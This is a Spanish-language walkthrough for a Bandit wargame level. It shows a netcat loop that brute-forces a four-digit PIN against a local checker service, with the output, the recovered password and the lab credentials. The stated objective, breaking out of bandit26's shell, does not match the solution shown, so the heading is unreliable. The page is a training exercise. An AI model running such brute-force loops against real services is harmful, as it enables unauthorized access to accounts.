# Level 25

## Objetivos
Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.

## Datos de acceso 
bandit24 <-UserName
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar <-Password

## Solución 
```bash
bandit24@bandit:~$ nc localhost 30002 <<< VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 1
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Fail! You did not supply enough data. Try again.
^C
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002

I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.

...

Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.


```

ó

```bash
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:~$
```
## Notas dicionales 
Podemos hacer una secuencia de esta forma {0000..9999} no imprimira números de cuatro digitos podemos realizar un for haciendo con esa secuancia y el comando "nc localhost 30002" 

podemos agregar al final  el comando "grep -v Wrong" para que nos filtre las respuestas incorrectas y quedarnos solo con el password